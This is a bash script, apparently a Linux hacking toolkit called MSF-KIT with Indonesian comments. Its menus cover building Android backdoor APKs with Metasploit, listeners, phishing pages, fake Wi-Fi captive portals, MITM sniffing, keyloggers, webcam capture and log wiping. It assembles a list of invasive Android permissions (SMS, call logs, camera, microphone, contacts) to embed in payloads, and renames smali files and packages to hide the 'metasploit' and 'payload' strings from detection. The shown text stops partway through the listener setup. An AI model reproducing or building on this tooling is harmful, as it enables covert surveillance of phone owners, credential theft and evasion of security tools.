#!/bin/bash
# created by K1M4K-ID
# sertakan nama author jika ingin merecode, ethical hacking!!
# tools multi function
# msfkit is a framework that creates & generates & embeds apk payloads to penetrate android platform
# update terbaru tools msfkit, open source
# terima kasih.

# config, jangan di ubah
fixjava=$(_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"' > /dev/null 2>&1)
host=$hostname
path=$(pwd)
mypath='${path}/Malware'
bul=$(date +"%B")
tan=$(date +"%d")
tim=$(date +"%T")
yer=$(date +"%Y")
waktu=$(printf "\033[31;1m$bul \033[31;1m$tan \033[37;1m$tim \033[31;1m$yer")
clear

# var untuk aplikasi
#
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
echo ""

# banner tools ini.
baner(){
printf "\033[32;1m""""
┌┬┐┌─┐┌─┐┬┌─┬┌┬┐ \033[37;1m author  :\033[31;1m K1M4K-ID
│││└─┐├┤ ├┴┐│ │  \033[37;1m support :\033[31;1m Invisible Protect Team
┴ ┴└─┘└  ┴ ┴┴ ┴  \033[37;1m date    : $waktu
_________________________________________________________________
|                                                               |
|     MSF-KIT => Hacking Tools, Exploit, Phising, Spoofing      |
|_______________________________________________________________|
|                                                               |
|                                                               |
|                                                               |
|                                                               |
|_______________________________________________________________|
"""
}

# animasi, spiner
spiner(){
bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
barlength=${#bar}
i=0
while ((i < 100));
do
	n=$((i*barlength / 100))
	printf "$ku1\r[%-${barlength}s]" "${bar:0:n}"
	((i += 1))
	sleep 0
	done
}

# cek koneksi internet
cekon(){
sleep 1
ping -c 1 8.8.8.8 > /dev/null 2>&1
if [ "$?" != "0" ]
then
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m memeriksa koneksi internet >>\033[31;1mfailed\n"
        sleep 0.025
        spiner
        echo
        printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m anda harus terhubung ke internet\033[31;1m :(\033[37;1m\n"
        sleep 0.025
        exit
        echo
        sleep 0.025
        else
        printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m check koneksi internet >>\033[32;1m connected\033[31;1m\n"
        sleep 0.025
fi
}

function remove()
{
    cd $path/Malware && rm -fr * >> /dev/null 2>&1
}

trap ctrl_c INT
ctrl_c(){
clear
echo
printf "\033[34;1m[\033[33;1mCTRL+C\033[34;1m]\033[34;1m Detected, Trying To Exit.. \033[37;1m\n"
sleep 1
printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1m Stop service . . . initialize \033[37;1m\n"
sleep 1
remove
sleep 1
printf "\033[34;1m[\033[33;1m*\033[34;1m]\033[34;1m Thank you, for use this tools :) \033[37;1m\n"
sleep 1
keluar
exit
}

# check dependencies
function dependencies(){
if [ -f /usr/bin/msfconsole ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m metasploit is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing metasploit!\n"
    apt-get install metasploit -y
    fi
    sleep 0.025

if [ -f /usr/bin/aapt ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m aapt is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing aapt!\n"
    apt-get install aapt -y
    fi
    sleep 0.025

if [ -f /usr/bin/zenity ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m zenity is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing zenity!\n"
    apt-get install zenity -y
    fi
    sleep 0.025

if [ -f /usr/bin/python3 ]; then
	  printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m python is already exists!\n"
	  else
	  printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing python3!\n"
	  apt-get install python3-pip
	  fi
	  sleep 0.025

if [ -f /usr/local/bin/apktool ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m apktool is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing apktool!\n"
    cd $path && wget https://raw.githubusercontent.com/K1M4K-ID/support/master/apktool > /dev/null 2>&1 && chmod +x apktool && mv apktool /usr/local/bin
    cd $path && wget https://github.com/K1M4K-ID/support/blob/master/apktool.jar?raw=true > /dev/null 2>&1 && mv -f apktool.jar?raw=true apktool.jar && mv apktool.jar /usr/local/bin

    fi
    sleep 0.025

if [ -f /usr/bin/java ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m java is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing java!\n"
    sudo apt-get install openjdk-11-jdk -y
    apt-get install openjdk-11-jre -y
    apt-get install openjdk-8-jdk -y
    apt-get install openjdk-8-jre -y
    fi
    sleep 0.025

if [ -f /usr/bin/jarsigner ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m jarsigner is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing jarsigner!\n"
    apt-get install default-jdk -y
    fi
    sleep 0.025

if [ -f /usr/bin/zipalign ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m zipalign is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing zipalign!\n"
    apt-get install zipalign -y
    fi
    sleep 0.025

if [ -f /usr/bin/adb ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m adb is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing adb!\n"
		apt-get install adb -y
		#cd $path && wget https://github.com/K1M4K-ID/adb-1.0.41/blob/main/adb.zip?raw=true > /dev/null 2>&1 && mv adb.zip?raw=true adb.zip && unzip adb.zip > /dev/null
    fi
    sleep 0.025

if [ -f /usr/bin/jarsigner ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m jarsigner is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing jarsigner!\n"
    apt-get install default-jdk -y
    fi
    sleep 0.025

# kali linux 2022.1 fix unable to locacate
# alternative error scrcpy, unable to locate
if [ -f /usr/bin/scrcpy ]; then
    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m scrcpy is already exists!\n"
    else
    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing scrcpy!\n"
		#sudo apt update -y
		sudo apt-get install scrcpy -y
		#sudo apt install snapd -y
		#sudo snap install core -y
		#sudo systemctl unmask snapd -y
		#sudo systemctl enable --now snapd -y
		#sudo snap install scrcpy -y
		#echo "alias scrcpy='/snap/bin/scrcpy'" >> ~/.zshrc

    fi
    sleep 0.025

if [ -d $path/data/out ]; then
			printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m path is already exists!\n"
			else
			printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m setup path & directory!\n"
			mkdir -p data/out

fi

#
#if [ -f /usr/bin/scrcpy ]; then
#    printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m scrcpy is already exists!\n"
#    else
#    printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing scrcpy!\n"
#    apt-get install scrcpy -y
#    fi
#    sleep 0.025
}

# check metasploit framework dan instalasi secara otomatis
function checkmetasploit(){
        which msfconsole > /dev/null 2>&1
        if [ "$?" -eq "0" ]
        then
        printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m metasploit . . . . . . . . . . . . . . . . . . . . .\033[32;1mfound"
        sleep 1
        which msfconsole > /dev/null 2>&1
        else
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m metasploit . . . . . . . . . . . . . . . . . . .\033[31;1mnot found"
        sleep 1
        printf "\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m metasploit tidak tersedia . . installing metasploit"
        sleep 1
        cekon
        printf "\033[31;1m[\033[34;1m✔\033[31;1m]\033[37;1m installing metasploit-framework please wait\033[31;1m"
        sleep 1
        printf "\033[31;1m[\033[34;1m✔\033[31;1m]\033[37;1m mohon tunggu beberapa saat . . jangan tutup terminal"
        sleep 1
        sudo apt-get install metasploit-framework -y
        echo
        printf "\033[31;1m[\033[34;1m✔\033[31;1m]\033[37;1m installing metasploit-framework succesfully\033[31;1m"
        sleep 1
        fi
}

# menu
function menu(){
        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m information gathering & osint\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m exploit attack metasploit\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m web attack xss & sql injection\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m wifi attack\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m5\033[31;1m]\033[37;1m sniffing & manInThemidle attack\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m6\033[31;1m]\033[37;1m social enggineering\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m exit\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        echo
        sleep 0.025
}

# menu jika user xyz 1
function information_gathering(){
	clear
	baner
	echo
	echo
        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m sosial media recon [\033[32;1m instagram, facebook, twiter\033[37;1m ]\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m osint search by name\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m osint instagram\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m4\033[31;1m]\033[37;1m nmap full scanning host\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m5\033[31;1m]\033[37;1m nmap scanning wifi\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m6\033[31;1m]\033[37;1m whois lookup recon\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m7\033[31;1m]\033[37;1m DNS lookup recon\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m8\033[31;1m]\033[37;1m search directory\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\n"
        sleep 0.025
        echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        echo
}

# menu jika user xyz 2
function metasploit(){
    clear
    baner
    echo
    echo
				printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m create payload android\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m create listerner\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        printf '\033[31;1m'
        sleep 0.025
        echo
}

# menu jika user xyz 3
function web_attack(){
    clear
    baner
    echo
    echo
        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m sql-injection  \033[31;1m(\033[32;1mfor scanning,attack and get database\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m xss-scanning \033[31;1m(\033[32;1mfor scanning xss\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m back\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'

}

# user input 4 sniffing & MITM
function sadap(){
        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m fluxion (hacking wifi with captive portal - fake ssid)\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m wifi-agent (fake wifi - for hacking account sosial media)\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m3\033[31;1m]\033[37;1m evillimiter (hacking wifi - kill wifi)\033[31;1m\n"
        sleep 0.025
				printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'

}

# user input 5 MITM
function mitm(){
        printf "\033[31;1m[\033[32;1m1\033[31;1m]\033[37;1m bettercap (sniffing networking)\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m2\033[31;1m]\033[37;1m MitM proxy (sniffing - http/https)\033[31;1m\n"
        sleep 0.025
				printf "\033[31;1m[\033[32;1m0\033[31;1m]\033[37;1m kembali\033[31;1m\n\n"
        sleep 0.025
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'
}


# user pilih menu lainya
function others(){
    clear
    baner
    echo
    echo
        printf "\033[31;1m[\033[32;1m01\033[31;1m] \033[37;1mmedia downloader, mp3,mp4 [\033[32;1minstagram, youtube, facebook\033[37;1m]\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m02\033[31;1m] \033[37;1madbsploit hacking\033[31;1m\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m03\033[31;1m] \033[37;1mphising scam page sosial media\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m04\033[31;1m] \033[37;1msocial enggineering, osint device & keyloager for\033[31;1m android\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m05\033[31;1m] \033[37;1mosint tools instagram recon\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m06\033[31;1m] \033[37;1mshortlink url\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m07\033[31;1m] \033[37;1mremove log\033[31;1m (\033[32;1mtools menghilangkan jejak\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m08\033[31;1m] \033[37;1mwebcam shoot, saycheese\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m09\033[31;1m] \033[37;1mxss scanning\033[31;1m (\033[32;1mXSS\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m10\033[31;1m] \033[37;1msql injection\033[31;1m (\033[32;1mSQLI\033[31;1m)\n"
        sleep 0.025
        printf "\033[31;1m[\033[32;1m00\033[31;1m] \033[37;1mkembali\n"
        sleep 0.025
        printf "\n"
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
        sleep 0.025
        printf '\033[31;1m'
        spiner
        echo

}

janda(){
printf '\033[31;1m'"""
░██████╗░█████╗░░█████╗░███╗░░██╗
██╔════╝██╔══██╗██╔══██╗████╗░██║
╚█████╗░██║░░██║██║░░██║██╔██╗██║
░╚═══██╗██║░░██║██║░░██║██║╚████║
██████╔╝╚█████╔╝╚█████╔╝██║░╚███║
╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚══╝

	 code by kimak
"""
}
keluar(){
printf '\033[31;1m'"""
███████╗██╗░░██╗██╗████████╗
██╔════╝╚██╗██╔╝██║╚══██╔══╝
█████╗░░░╚███╔╝░██║░░░██║░░░
██╔══╝░░░██╔██╗░██║░░░██║░░░
███████╗██╔╝╚██╗██║░░░██║░░░
╚══════╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░

      code by kimak
"""
}

# runner numb 1
# information gathering
function search(){
	printf '\033[31;1m'
	spiner
	echo
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
        sleep 0.025
        spiner
        clear
        bash $path/.data/recon/userrecon.sh
        mv *.txt data/out > /dev/null 2>&1
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025

}

# information gathering
function osint(){
	printf '\033[31;1m'
	spiner
	echo
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
        sleep 0.025
        spiner
        clear
        python3 $path/.data/osint/osints.py
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] back "'\033[34;1m')" xyz
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025

}

# information gathering
function osintinstagram(){
    clear
    baner
    echo
    spiner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1msetup osint, set username && password\033[31;1m\n"
    sleep 0.025
    spiner
    echo
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrunning osint\033[31;1m\n"
    sleep 0.025
    spiner
    echo
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    spiner
    echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/Osint ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mOsint already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m Osint \033[31;1mnot found\033[37;1m, installing Osint!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/Datalux/Osintgram > /dev/null 2>&1;mv -f Osintgram Osint > /dev/null 2>&1
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

        cd $path/.data/Osint && make setup && cd $path/.data/Osint && pip3 install -r requirements.txt
        osintinstagram
        sleep 2

        elif [ $xyz = "2"  ];
        then
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> contoh_\n"
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m target : "'\033[34;1m')" target
        cd $path/.data/Osint && python3 main.py $target
        sleep 3
        osintinstagram

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        osintinstagram
        fi
}

# menu user memilih scan  nmap host root
function nmproot(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    spiner
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 74.125.24.102\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    spiner
    printf '\033[37;1m'
    echo
    nmap -v -sS -Pn -O $target
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
        echo
        while true
        do
                if [ $scan = "y"  ];
                then
                nmproot

                else [ $scan != "y" ]

                fi
        done
}

# menu user memilih scan nmap wifi
function nmpwifi(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    spiner
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> 192.168.1.1/24\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    spiner
    printf '\033[37;1m'
    echo
    nmap -sP $target
    printf '\033[31;1m'
    spiner
    sleep 0.025
    echo
            read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
            echo
            while true
            do
                    if [[ $scan = "y"  ]];
                    then
                    nmpwifi

                    else [[ $scan != "y"  ]];
                    run_information
                    fi
            done

}

wgetfind()
{
  printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
  sleep 0
  spiner
  echo
  printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> paypal.com\n"
  printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" url
  printf '\033[31;1m'
  spiner
  printf '\033[37;1m'
  echo
  wget -qO- $url | tr \" \\n | grep -Eio "https?://[^;),'\\]+" | sort -u | nl
  sleep 0
  printf '\033[31;1m'
  spiner
  echo
          read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
          echo
            while true
            do
                  if [[ $scan = "y"  ]];
                  then
                  wgetfind

                  else [[ $scan != "y" ]]
                  run_information
                  fi
            done
}

# menu user memilih whois
function whs(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    spiner
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    spiner
    printf '\033[37;1m'
    echo
    whois $target
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
    echo
        while true
        do
            if [ $scan = "y"  ];
            then
            whs

            else
            run_information
            fi
        done

}
# menu user memilih DNS
function dns(){
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
    sleep 0.025
    spiner
    echo
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
    printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] target : "'\033[34;1m')" target
    printf '\033[31;1m'
    spiner
    printf '\033[37;1m'
    echo
    dnsenum $target
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
        echo
                if [ $scan = "y"  ];
                then
                dns
                else [ $scan != "y" ]
                run_information
                fi
}

function run_information(){
    information_gathering
    while true
    do
    case $xyz in
        1) search;;
        2) osint;;
        3) osintinstagram;;
        4) nmproot;;
        5) nmpwifi;;
        6) whs;;
        7) dns;;
        8) wgetfind;;
        0) runer;;
        *) printf "\033[31;1m[\033[32;1m!\033[31;1m]\033[37;1m please input in options . . .\n"
           sleep 3;run_information;;
    esac
    done

}

# runner numb 2
# exploit metasploit

# fungsi seting ip dan port
function sets(){
        clear
        baner
        printf '\033[31;1m'
        echo
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
        spiner
        echo
        sleep 2
}

#fungsi seting network original
#
function sets_original(){
        clear
        baner
        printf '\033[31;1m'
        echo
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        spiner
        echo
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama backdoor  : "'\033[34;1m')" nama
        printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
        printf '\033[31;1m'
        spiner
        echo
        sleep 2
}

# fungsi listener untuk eksekusi backdoor
function listener_kali(){
        clear
        baner
        printf '\033[31;1m'
        echo
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip listener anda\033[31;1m\n"
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1mlocal\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        ifconfig eth0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        sleep 0.025
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1mwifi\033[37;1m)\033[31;1m\n"
        spiner
        echo
        echo
        sleep 0.025
        ifconfig wlan0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] forward ip address anda, tun0(\033[31;1mforward\033[37;1m)\n"
        printf '\033[31;1m'
        spiner
        echo
        echo
        sleep 0.025
        ifconfig tun0|grep "inet"|awk 'NR == 1 {print $2}'
        echo
        spiner
        echo
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan lhost  : "'\033[34;1m')" lh
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan port   : "'\033[34;1m')" lp
        printf '\033[31;1m'
        spiner
        echo
        sleep 0.025
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting apache2 && database (\033[32;1mruning\033[37;1m)\n"
